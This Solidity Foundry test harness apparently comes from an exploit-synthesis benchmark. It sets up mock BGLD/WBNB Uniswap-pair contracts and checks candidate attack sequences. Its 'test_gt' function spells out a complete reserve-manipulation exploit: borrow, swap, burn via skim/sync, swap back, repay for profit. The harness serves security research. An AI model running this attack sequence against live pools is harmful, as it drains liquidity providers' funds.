// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BGLD} from "./BGLD.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract BGLDTest is Test, BlockLoader {
    BGLD bgld;
    WBNB wbnb;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bgldAddr;
    address wbnbAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1670859422;
    uint112 reserve0pair = 8795812119540504580;
    uint112 reserve1pair = 231743012965866;
    uint32 blockTimestampLastpair = 1670630737;
    uint256 kLastpair = 2034636816537464565510795933100323;
    uint256 price0CumulativeLastpair = 2112483169472590267684139563968449299;
    uint256 price1CumulativeLastpair =
        33872365564206101577328167072697709763805828699;
    uint256 totalSupplywbnb = 3826675582457907209504130;
    uint256 balanceOfwbnbpair = 8795812119540504580;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplybgld = 95635970100586657817;
    uint256 balanceOfbgldpair = 231743012965866;
    uint256 balanceOfbgldattacker = 0;

    function setUp() public {
        owner = address(this);
        bgld = new BGLD();
        bgldAddr = address(bgld);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        pair = new UniswapV2Pair(
            address(wbnb),
            address(bgld),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        bgld.mint(100e18);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        bgld.transfer(address(pair), balanceOfbgldpair);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bgld Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(bgld),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(bgld),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(wbnb),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(pair),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(bgld),
            address(attacker),
            bgld.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_bgld_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        bgld.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bgld_owner(uint256 amount) internal eurus {
        bgld.transfer(owner, amount);
    }

    function borrow_wbnb_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_pair(uint256 amount) internal eurus {
        wbnb.transfer(address(pair), amount);
    }

    function borrow_bgld_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        bgld.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bgld_pair(uint256 amount) internal eurus {
        bgld.transfer(address(pair), amount);
    }

    function swap_pair_attacker_wbnb_bgld(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_bgld_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        bgld.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_bgld_pair(uint256 amount) internal eurus {
        bgld.transfer(address(pair), amount);
        pair.skim(attacker);
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        swap_pair_attacker_bgld_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        burn_bgld_pair(amt1);
        swap_pair_attacker_wbnb_bgld(amt2, amt3);
        swap_pair_attacker_bgld_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        burn_bgld_pair(amt3);
        swap_pair_attacker_bgld_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_bgld_owner(amt0);
        swap_pair_attacker_bgld_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_bgld(amt3, amt4);
        payback_bgld_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_bgld_owner(amt0);
        burn_bgld_pair(amt1);
        swap_pair_attacker_bgld_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_bgld(amt4, amt5);
        payback_bgld_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_bgld_owner(amt0);
        swap_pair_attacker_bgld_wbnb(amt1, amt2);
        burn_bgld_pair(amt3);
        swap_pair_attacker_wbnb_bgld(amt4, amt5);
        payback_bgld_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        swap_pair_attacker_bgld_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_bgld(amt5, amt6);
        swap_pair_attacker_bgld_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        burn_bgld_pair(amt1);
        swap_pair_attacker_wbnb_bgld(amt2, amt3);
        swap_pair_attacker_bgld_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_bgld(amt6, amt7);
        swap_pair_attacker_bgld_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        burn_bgld_pair(amt3);
        swap_pair_attacker_bgld_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_bgld(amt6, amt7);
        swap_pair_attacker_bgld_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        swap_pair_attacker_bgld_wbnb(amt3, amt4);
        burn_bgld_pair(amt5);
        swap_pair_attacker_wbnb_bgld(amt6, amt7);
        swap_pair_attacker_bgld_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        swap_pair_attacker_bgld_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_bgld(amt5, amt6);
        burn_bgld_pair(amt7);
        swap_pair_attacker_bgld_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_bgld_owner(amt0);
        swap_pair_attacker_bgld_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_bgld(amt3, amt4);
        swap_pair_attacker_bgld_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_bgld(amt7, amt8);
        payback_bgld_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_bgld_owner(amt0);
        burn_bgld_pair(amt1);
        swap_pair_attacker_bgld_wbnb(amt2, amt3);
        swap_pair_attacker_wbnb_bgld(amt4, amt5);
        swap_pair_attacker_bgld_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_bgld(amt8, amt9);
        payback_bgld_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_bgld_owner(amt0);
        swap_pair_attacker_bgld_wbnb(amt1, amt2);
        burn_bgld_pair(amt3);
        swap_pair_attacker_wbnb_bgld(amt4, amt5);
        swap_pair_attacker_bgld_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_bgld(amt8, amt9);
        payback_bgld_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_bgld_owner(amt0);
        swap_pair_attacker_bgld_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_bgld(amt3, amt4);
        burn_bgld_pair(amt5);
        swap_pair_attacker_bgld_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_bgld(amt8, amt9);
        payback_bgld_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_bgld_owner(amt0);
        swap_pair_attacker_bgld_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_bgld(amt3, amt4);
        swap_pair_attacker_bgld_wbnb(amt5, amt6);
        burn_bgld_pair(amt7);
        swap_pair_attacker_wbnb_bgld(amt8, amt9);
        payback_bgld_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 125e18);
        borrow_wbnb_owner(125e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
        emit log_named_uint(
            "amt2",
            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 9) /
                10
        );
        swap_pair_attacker_wbnb_bgld(
            wbnb.balanceOf(attacker),
            (pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 9) /
                10
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", bgld.balanceOf(address(pair)) * 10);
        burn_bgld_pair(bgld.balanceOf(address(pair)) * 10);
        printBalance("After step2 ");
        emit log_named_uint("amt4", 100 * 1e6);
        emit log_named_uint(
            "amt5",
            pair.getAmountOut(100 * 1e6, address(bgld))
        );
        swap_pair_attacker_bgld_wbnb(
            100 * 1e6,
            pair.getAmountOut(100 * 1e6, address(bgld))
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", (125e18 * 1003) / 1000);
        payback_wbnb_owner((125e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_bgld(amt1, amt2);
        burn_bgld_pair(amt3);
        swap_pair_attacker_bgld_wbnb(amt4, amt5);
        payback_wbnb_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
